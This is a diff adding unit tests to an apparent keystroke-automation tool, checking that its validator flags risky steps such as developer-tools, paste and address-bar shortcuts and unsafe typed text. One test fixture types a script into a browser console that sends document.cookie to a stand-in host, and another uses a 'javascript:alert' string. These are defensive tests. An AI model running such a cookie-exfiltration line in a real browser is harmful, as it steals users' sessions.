@@ -424,6 +424,10 @@ def test_candidate_confidence() -> None:
     ("Ctrl+Alt+Delete", m.IssueLevel.ERROR), ("Alt+Space", m.IssueLevel.ERROR),
     ("Ctrl+L", m.IssueLevel.WARNING), ("Alt+D", m.IssueLevel.WARNING), ("Ctrl+W", m.IssueLevel.WARNING),
     ("Enter", None), ("Esc", None), ("Ctrl+A", None), ("Shift+Tab", None), ("nonsense", None),
+    # integration (gate G-02): developer tools, page source and paste are refused
+    ("F12", m.IssueLevel.ERROR), ("Ctrl+Shift+I", m.IssueLevel.ERROR), ("Ctrl+Shift+J", m.IssueLevel.ERROR),
+    ("Ctrl+Shift+C", m.IssueLevel.ERROR), ("Ctrl+Shift+K", m.IssueLevel.ERROR), ("Ctrl+U", m.IssueLevel.ERROR),
+    ("Ctrl+V", m.IssueLevel.ERROR), ("Shift+Insert", m.IssueLevel.ERROR), ("Ctrl+Shift+V", m.IssueLevel.ERROR),
 ])
 def test_combo_risk(combo: str, level: m.IssueLevel | None) -> None:
     assert m.combo_risk(combo)[0] is level
@@ -450,6 +454,53 @@ def test_hostile_shared_profile_is_refused_and_disarmed() -> None:
     q = m.Profile(target=m.TargetMatch(exe="Game.exe", title="Game"), last_test_ok_at="x")
     q.prepare_import()
     assert q.suggested_exe == "Game.exe" and q.target == m.TargetMatch() and q.last_test_ok_at == ""
+
+
+def test_devtools_script_profile_is_flagged() -> None:
+    """Gate G-02: the reviewer's probe - a chrome profile opens the console and types script with
+    {code} inside; the key step is an ERROR, the text line and the run rules are highlighted."""
+    p = m.Profile(name="faster", target=m.TargetMatch(exe="chrome.exe", title="兌換"))
+    p.steps = [m.make_step(m.StepType.KEY), m.make_step(m.StepType.TYPE_TEXT), m.make_step(m.StepType.TYPE_CODE)]
+    p.steps[0].params.keys = "Ctrl+Shift+J"
+    p.steps[1].params.text = 'fetch("https://x.example/?"+document.cookie+"{code}")\n'
+    p.policy.stop_after_failures, p.policy.pause_after_invalid, p.policy.max_cooldowns = 0, 0, 20
+    issues = p.validate()
+    assert any(i.path == "steps[0].params.keys" and i.level is m.IssueLevel.ERROR for i in issues)
+    assert any(i.path == "steps[1].params.text" and i.level is m.IssueLevel.WARNING for i in issues)
+    lines = p.action_lines()
+    assert lines[0][1] and lines[1][1] and "↵" in lines[1][0] and "\n" not in lines[1][0]
+    rules = p.policy_lines()
+    assert len(rules) == 3 and all(risky for _t, risky in rules)
+    assert m.Profile().policy_lines() == []
+
+
+def test_address_bar_shortcuts_are_refused_for_browser_targets() -> None:
+    p = m.Profile(target=m.TargetMatch(exe="msedge.exe", title="兌換"))
+    p.steps = [m.make_step(m.StepType.KEY)]
+    p.steps[0].params.keys = "Ctrl+L"
+    assert any(i.path == "steps[0].params.keys" and i.level is m.IssueLevel.ERROR for i in p.validate())
+    p.target = m.TargetMatch()  # an import: no target yet, the author's program is a browser
+    p.suggested_exe = "chrome.exe"
+    assert any(i.path == "steps[0].params.keys" and i.level is m.IssueLevel.ERROR for i in p.validate())
+    p.suggested_exe = "game.exe"
+    assert [i.level for i in p.validate() if i.path == "steps[0].params.keys"] == [m.IssueLevel.WARNING]
+
+
+def test_text_is_risky_and_ocr_check_summary() -> None:
+    assert m.text_is_risky("a\nb") and m.text_is_risky("x\ty") and m.text_is_risky(" JavaScript :alert(1)")
+    assert not m.text_is_risky("/redeem {code}") and not m.text_is_risky("metadata: {code}")
+    oc = m.make_step(m.StepType.OCR_CHECK)
+    assert oc.summary() in ("尚未設定結果範圍", "Result region not set")
+
+
+def test_target_with_unknown_exe_needs_class_or_exact_title() -> None:
+    """Gate G-03: exe "" matches a window of ANY program."""
+    loose = m.TargetMatch(exe="", title="兌換", title_mode=m.TitleMatch.CONTAINS)
+    assert loose.exe_unknown()
+    assert any(i.path == "target.exe" and i.level is m.IssueLevel.ERROR for i in m.Profile(target=loose).validate())
+    assert not m.TargetMatch(exe="", title="兌換", title_mode=m.TitleMatch.EXACT).exe_unknown()
+    assert not m.TargetMatch(exe="", class_name="UnityWndClass").exe_unknown()
+    assert not m.TargetMatch().exe_unknown() and not m.TargetMatch(exe="game.exe", title="x").exe_unknown()
 
 
 def test_browser_target_needs_title() -> None:
